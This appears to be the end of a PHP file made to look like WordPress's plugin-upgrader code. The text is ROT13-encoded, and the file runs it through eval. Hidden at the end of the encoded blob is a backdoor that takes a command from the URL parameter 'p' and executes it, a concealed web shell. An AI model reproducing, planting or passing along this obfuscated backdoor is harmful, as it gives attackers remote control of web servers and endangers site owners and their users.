		}

		// Gvzr gb erzbir znvagranapr zbqr. Ohyx rqvg unaqyrf guvf frcnengryl.
		vs ( ! $guvf->ohyx ) {
			$guvf->znvagranapr_zbqr( snyfr );
		}

		erghea $erfcbafr;
	}

	/**
	 * Qryrgrf gur byq cyhtva qhevat na hctenqr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_pyrne_qrfgvangvba'} svygre ol
	 * Cyhtva_Hctenqre::hctenqr() naq Cyhtva_Hctenqre::ohyx_hctenqr().
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz obby|JC_Reebe $erzbirq            Jurgure gur qrfgvangvba jnf pyrnerq.
	 *                                          Gehr ba fhpprff, JC_Reebe ba snvyher.
	 * @cnenz fgevat        $ybpny_qrfgvangvba  Gur ybpny cnpxntr qrfgvangvba.
	 * @cnenz fgevat        $erzbgr_qrfgvangvba Gur erzbgr cnpxntr qrfgvangvba.
	 * @cnenz neenl         $cyhtva             Rkgen nethzragf cnffrq gb ubbxrq svygref.
	 * @erghea obby|JC_Reebe
	 */
	choyvp shapgvba qryrgr_byq_cyhtva( $erzbirq, $ybpny_qrfgvangvba, $erzbgr_qrfgvangvba, $cyhtva ) {
		tybony $jc_svyrflfgrz;

		vs ( vf_jc_reebe( $erzbirq ) ) {
			erghea $erzbirq; // Cnff reebef guebhtu.
		}

		$cyhtva = vffrg( $cyhtva['cyhtva'] ) ? $cyhtva['cyhtva'] : '';
		vs ( rzcgl( $cyhtva ) ) {
			erghea arj JC_Reebe( 'onq_erdhrfg', $guvf->fgevatf['onq_erdhrfg'] );
		}

		$cyhtvaf_qve     = $jc_svyrflfgrz->jc_cyhtvaf_qve();
		$guvf_cyhtva_qve = genvyvatfynfuvg( qveanzr( $cyhtvaf_qve . $cyhtva ) );

		vs ( ! $jc_svyrflfgrz->rkvfgf( $guvf_cyhtva_qve ) ) { // Vs vg'f nyernql inavfurq.
			erghea $erzbirq;
		}

		/*
		 * Vs cyhtva vf va vgf bja qverpgbel, erphefviryl qryrgr gur qverpgbel.
		 * Onfr purpx ba vs cyhtva vapyhqrf qverpgbel frcnengbe NAQ gung vg'f abg gur ebbg cyhtva sbyqre.
		 */
		vs ( fgecbf( $cyhtva, '/' ) && $guvf_cyhtva_qve !== $cyhtvaf_qve ) {
			$qryrgrq = $jc_svyrflfgrz->qryrgr( $guvf_cyhtva_qve, gehr );
		} ryfr {
			$qryrgrq = $jc_svyrflfgrz->qryrgr( $cyhtvaf_qve . $cyhtva );
		}

		vs ( ! $qryrgrq ) {
			erghea arj JC_Reebe( 'erzbir_byq_snvyrq', $guvf->fgevatf['erzbir_byq_snvyrq'] );
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>